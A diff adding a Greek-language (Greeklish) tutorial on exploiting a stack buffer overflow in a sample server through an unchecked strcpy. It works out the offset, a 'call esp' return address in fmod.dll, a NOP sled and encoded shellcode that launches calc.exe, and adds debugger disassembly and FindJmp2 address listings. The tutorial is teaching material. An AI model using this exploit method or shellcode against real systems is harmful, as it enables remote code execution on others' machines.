@@ -1,0 +1,332 @@
+-=============================================================================-
+[-] Remote Buffer Overflow xrisimopiodas Shared Library (fmod.dll) ret esp
+-=============================================================================-
+[target] : server.exe
+	//30 bytes long //1024 bytes long
+[bug] : strcpy(username,data); ouch:P
+[payload] : WinExec calc.exe
+[shared lib] : fmod.dll
+-=============================================================================-
+
+I. katarxin gia na parakolouthisete afto to aplo tutorial prepi na kserete 
+ta vasika pragmata pano se buffer overflows
+
+II. Giati xrisimopioume ret apo shard library? Me tin xrisi shared librarys ta exploits
+ginode universal diladi [0x10041E2B] ine i adress pou exi to dll kai epidi to dll
+ine i idia version se ola ta OS den alazi i ret an xrisimopiousame kapio
+dll tou sistimatos opos KERNEL32 USER32 i ret tha alaze analogos me tin ekdosi logismikou
+
+III. Giati call esp kai oxi kapion alo kataxoriti? Giati poli apla o esp krataei 
+tin diefthinsi tou shellcode mas
+
+/*
+EAX 00000165
+ECX 00421F20 main.00421F20
+EDX 00421F20 main.00421F20
+EBX 7FFDD000
+ESP 0012FA58 //shellcode 
+EBP 41414141 //junk BYTES 0x41
+ESI FFFFFFFF
+EDI 0012FF2C
+
+EIP 10041E2B fmod.10041E2B //jmp se esp
+*/
+
+IV. BoF Trigger. kitodas kala to source tha doume afto /*char username[30] = "";*/
+tora kseroume oti o buffer xoraei 30 bytes OK gia pame parakato
+/*char USER[] = "user";*/ opos vlepoume to programa xrisimopiei mia edoli "user"
+otan o client stili aftin tin edoli o server tha kitaksi an sto packet iparxi afti i edoli
+/*if(strstr(buff,USER) !=0 )*/ kai ean iparxi
+tha kani to eksis lathos
+/*strcpy(username,data);*/
+pistevodas diladi oti o user den tha dosei parapano apo 30 bytes onoma
+kai xoris na kani kapio size check tha kani copy olokliro to paketo mexri na sinadisi kapio NULL
+ston buffer username
+
+Kserodas oti user = 4 bytes + space(0x20) = 5 bytes ipologizoume to buffer overflow
+payload = "user " + "\x41" * 31
+5 + 31 = 36 bytes
+tora kseroume oti theloume 36 bytes gia na xrisimopihsoume to bug
+
+V. Ret Jump. exodas enan buffer pou exi mesa 36 bytes dinoume tin ret mas
+payload = "user " + "\x41" * 31
+payload += "\x2b\x1e\x04\x10" //opos vlepete i ret ine anapoda(endian)
+gia na to eksakrivosoume afto
+fortonoume to programa se ollydbg kai molis treksi patame ctr  + g kai kanoume paste 0x10041E2B
+tha pame stin sigekrimeni diefthinsi kai tha valoume ena brakepoint patodas f2
+stin sinexia trexoume to xploit kai tha doume oti i EIP mas ine stin diefthinsi pou dosame
+
+VI. NOPs. Giati vazume nops? An den valoume merika nop borei na sinadisoume kapia provlimata opos na 
+iparxoun kapia bytes pou tha mas ebodisoun na treksoume to payload mas kanodas to programa na krasari
+xoris na exi ftasi eki pou theloume
+
+payload = "user " + "\x41" * 31
+payload += "\x2b\x1e\x04\x10" #10041E2B  call esp fmod.dll shared library
+payload += '\x90' * 141
+
+VII. Payload. Tora afou i ret mas doulevei mia xara sinexizoume vazodas kai to shellcode
+
+payload = "user " + "\x41" * 31
+payload += "\x2b\x1e\x04\x10" #10041E2B  call esp fmod.dll shared library
+payload += '\x90' * 141
+#calc exec
+payload += (
+"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc6"
+"\x90\xb4\x70\x83\xeb\xfc\xe2\xf4\x3a\x78\xf0\x70\xc6\x90\x3f\x35"
+"\xfa\x1b\xc8\x75\xbe\x91\x5b\xfb\x89\x88\x3f\x2f\xe6\x91\x5f\x39"
+"\x4d\xa4\x3f\x71\x28\xa1\x74\xe9\x6a\x14\x74\x04\xc1\x51\x7e\x7d"
+"\xc7\x52\x5f\x84\xfd\xc4\x90\x74\xb3\x75\x3f\x2f\xe2\x91\x5f\x16"
+"\x4d\x9c\xff\xfb\x99\x8c\xb5\x9b\x4d\x8c\x3f\x71\x2d\x19\xe8\x54"
+"\xc2\x53\x85\xb0\xa2\x1b\xf4\x40\x43\x50\xcc\x7c\x4d\xd0\xb8\xfb"
+"\xb6\x8c\x19\xfb\xae\x98\x5f\x79\x4d\x10\x04\x70\xc6\x90\x3f\x18"
+"\xfa\xcf\x85\x86\xa6\xc6\x3d\x88\x45\x50\xcf\x20\xae\x60\x3e\x74"
+"\x99\xf8\x2c\x8e\x4c\x9e\xe3\x8f\x21\xf3\xd5\x1c\xa5\x90\xb4\x70")
+
+fortonoume to programa pali se ollydbg kai molis treksi patame ctr  + g kai kanoume paste 0x10041E2B
+vazoume brake point pali kai stelnoume to xploit tha doume pali oti egine brake tha doume ta nops pou valame
+kai pio kato telika ine o kodikas pou theloume patodas tora f9 tha doume to calc.exe pou tha emfanisti apo to pouthena
+
+opote tha exoume kati apo to parakato ->
+
+/*12FA69*/  nop
+/*12FA6A*/  nop
+/*12FA6B*/  nop
+/*12FA6C*/  nop
+/*12FA6D*/  nop
+/*12FA6E*/  nop
+/*12FA6F*/  nop
+/*12FA70*/  nop
+/*12FA71*/  nop
+/*12FA72*/  nop
+/*12FA73*/  nop
+/*12FA74*/  nop
+/*12FA75*/  nop
+/*12FA76*/  nop
+/*12FA77*/  nop
+/*12FA78*/  nop
+/*12FA79*/  nop
+/*12FA7A*/  nop
+/*12FA7B*/  nop
+/*12FA7C*/  nop
+/*12FA7D*/  nop
+/*12FA7E*/  nop
+/*12FA7F*/  nop
+/*12FA80*/  nop
+/*12FA81*/  nop
+/*12FA82*/  nop
+/*12FA83*/  nop
+/*12FA84*/  nop
+/*12FA85*/  nop
+/*12FA86*/  nop
+/*12FA87*/  nop
+/*12FA88*/  nop
+/*12FA89*/  nop
+/*12FA8A*/  nop
+/*12FA8B*/  nop
+/*12FA8C*/  nop
+/*12FA8D*/  nop
+/*12FA8E*/  nop
+/*12FA8F*/  nop
+/*12FA90*/  nop
+/*12FA91*/  nop
+/*12FA92*/  nop
+/*12FA93*/  nop
+/*12FA94*/  nop
+/*12FA95*/  nop
+/*12FA96*/  nop
+/*12FA97*/  nop
+/*12FA98*/  nop
+/*12FA99*/  nop
+/*12FA9A*/  nop
+/*12FA9B*/  nop
+/*12FA9C*/  nop
+/*12FA9D*/  nop
+/*12FA9E*/  nop
+/*12FA9F*/  nop
+/*12FAA0*/  nop
+/*12FAA1*/  nop
+/*12FAA2*/  nop
+/*12FAA3*/  nop
+/*12FAA4*/  nop
+/*12FAA5*/  nop
+/*12FAA6*/  nop
+/*12FAA7*/  nop
+/*12FAA8*/  nop
+/*12FAA9*/  nop
+/*12FAAA*/  nop
+/*12FAAB*/  nop
+/*12FAAC*/  nop
+/*12FAAD*/  nop
+/*12FAAE*/  nop
+/*12FAAF*/  nop
+/*12FAB0*/  nop
+/*12FAB1*/  nop
+/*12FAB2*/  nop
+/*12FAB3*/  nop
+/*12FAB4*/  nop
+/*12FAB5*/  nop
+/*12FAB6*/  nop
+/*12FAB7*/  nop
+/*12FAB8*/  nop
+/*12FAB9*/  nop
+/*12FABA*/  nop
+/*12FABB*/  nop
+/*12FABC*/  nop
+/*12FABD*/  nop
+/*12FABE*/  nop
+/*12FABF*/  nop
+/*12FAC0*/  nop
+/*12FAC1*/  nop
+/*12FAC2*/  nop
+/*12FAC3*/  nop
+/*12FAC4*/  nop
+/*12FAC5*/  nop
+/*12FAC6*/  nop
+/*12FAC7*/  nop
+/*12FAC8*/  nop
+/*12FAC9*/  nop
+/*12FACA*/  nop
+/*12FACB*/  nop
+/*12FACC*/  nop
+/*12FACD*/  nop
+/*12FACE*/  nop
+/*12FACF*/  nop
+/*12FAD0*/  nop
+/*12FAD1*/  nop
+/*12FAD2*/  nop
+/*12FAD3*/  nop
+/*12FAD4*/  nop
+/*12FAD5*/  nop
+/*12FAD6*/  nop
+/*12FAD7*/  nop
+/*12FAD8*/  nop
+/*12FAD9*/  nop
+/*12FADA*/  nop
+/*12FADB*/  nop
+/*12FADC*/  nop
+/*12FADD*/  nop
+/*12FADE*/  nop
+/*12FADF*/  nop
+/*12FAE0*/  nop
+/*12FAE1*/  nop
+/*12FAE2*/  nop
+/*12FAE3*/  nop
+/*12FAE4*/  nop
+/*12FAE5*/  sub     ecx, ecx
+/*12FAE7*/  sub     ecx, -22
+/*12FAEA*/  fldz
+/*12FAEC*/  fstenv  (28-byte) ptr [esp-C]
+/*12FAF0*/  pop     ebx
+/*12FAF1*/  xor     dword ptr [ebx+13], 70B490C6
+/*12FAF8*/  sub     ebx, -4
+/*12FAFB*/  loopd   short 0012FAF1
+/*12FAFD*/  cld
+/*12FAFE*/  call    0012FB47
+/*12FB03*/  mov     eax, dword ptr [ebp+3C]
+/*12FB06*/  mov     edi, dword ptr [ebp+eax+78]
+/*12FB0A*/  add     edi, ebp
+/*12FB0C*/  mov     ecx, dword ptr [edi+18]
+/*12FB0F*/  mov     ebx, dword ptr [edi+20]
+/*12FB12*/  add     ebx, ebp
+/*12FB14*/  dec     ecx
+/*12FB15*/  mov     esi, dword ptr [ebx+ecx*4]
+/*12FB18*/  add     esi, ebp
+/*12FB1A*/  xor     eax, eax
+/*12FB1C*/  cdq
+/*12FB1D*/  lods    byte ptr [esi]
+/*12FB1E*/  test    al, al
+/*12FB20*/  je      short 0012FB29
+/*12FB22*/  ror     edx, 0D
+/*12FB25*/  add     edx, eax
+/*12FB27*/  jmp     short 0012FB1D
+/*12FB29*/  cmp     edx, dword ptr [esp+4]
+/*12FB2D*/  jnz     short 0012FB14
+/*12FB2F*/  mov     ebx, dword ptr [edi+24]
+/*12FB32*/  add     ebx, ebp
+/*12FB34*/  mov     cx, word ptr [ebx+ecx*2]
+/*12FB38*/  mov     ebx, dword ptr [edi+1C]
+/*12FB3B*/  add     ebx, ebp
+/*12FB3D*/  mov     ebx, dword ptr [ebx+ecx*4]
+/*12FB40*/  add     ebx, ebp
+/*12FB42*/  mov     dword ptr [esp+4], ebx
+/*12FB46*/  retn
+
+VIII. FindJump2. Ena oreo tool pou mas voithaei na vroume tin ret se opio kataxoriti theloume se opio exe/dll theloume
+usage :
+/*
+C:\Program Files\Support Tools>"C:\Documents and Settings\Doni\Desktop\remote_bo
+f_with_shared_library\Findjmp2.exe" kernel32 eax
+
+Findjmp, Eeye, I2S-LaB
+Findjmp2, Hat-Squad
+Scanning kernel32 for code useable with the eax register
+0x7C81948F      call eax
+0x7C81FD51      pop eax - pop - retbis
+0x7C821988      pop eax - pop - retbis
+0x7C837AEE      call eax
+0x7C8399D7      push eax - ret
+0x7C839B4F      call eax
+0x7C839B97      call eax
+0x7C839D9F      pop eax - pop - ret
+0x7C83AC14      call eax
+0x7C83AEF9      call eax
+0x7C83B5E0      call eax
+0x7C83B648      call eax
+0x7C83B654      call eax
+0x7C83B669      call eax
+0x7C83C0D2      call eax
+0x7C83C322      call eax
+0x7C83CD91      call eax
+0x7C83CE27      call eax
+0x7C83D654      call eax
+0x7C83D67D      call eax
+0x7C83F2EF      call eax
+0x7C83F4AF      call eax
+0x7C840429      call eax
+0x7C8404B9      call eax
+0x7C8413BE      call eax
+0x7C841823      call eax
+0x7C8420A2      call eax
+0x7C843BC7      call eax
+0x7C843C03      call eax
+0x7C843C43      call eax
+0x7C843C7F      call eax
+0x7C843CBF      call eax
+0x7C843E35      call eax
+0x7C8442C2      call eax
+0x7C844364      call eax
+0x7C8444A3      call eax
+0x7C84BCE2      call eax
+0x7C84BEB1      call eax
+0x7C85783B      call eax
+0x7C857E9C      call eax
+0x7C857F70      call eax
+0x7C85CAD1      call eax
+0x7C85D6A4      jmp eax
+0x7C86108F      pop eax - pop - retbis
+0x7C86163A      call eax
+0x7C861823      call eax
+0x7C8669CE      call eax
+0x7C866B9A      call eax
+0x7C866D6A      call eax
+0x7C87245F      call eax
+0x7C87E548      pop eax - pop - ret
+0x7C87ED9A      pop eax - pop - retbis
+0x7C87F332      pop eax - pop - retbis
+0x7C87F632      pop eax - pop - retbis
+0x7C87F64D      pop eax - pop - retbis
+0x7C87F668      pop eax - pop - retbis
+0x7C87F683      pop eax - pop - retbis
+0x7C87F69E      pop eax - pop - retbis
+0x7C87F6B9      pop eax - pop - retbis
+0x7C87F700      pop eax - pop - retbis
+0x7C87F71C      pop eax - pop - retbis
+0x7C87F776      pop eax - pop - retbis
+0x7C87F79C      pop eax - pop - retbis
+0x7C87F9B4      pop eax - pop - retbis
+0x7C87F9CF      pop eax - pop - retbis
+0x7C87F9F4      pop eax - pop - retbis
+0x7C87FA0F      pop eax - pop - retbis
+Finished Scanning kernel32 for code useable with the eax register
+Found 67 usable addresses
+*/
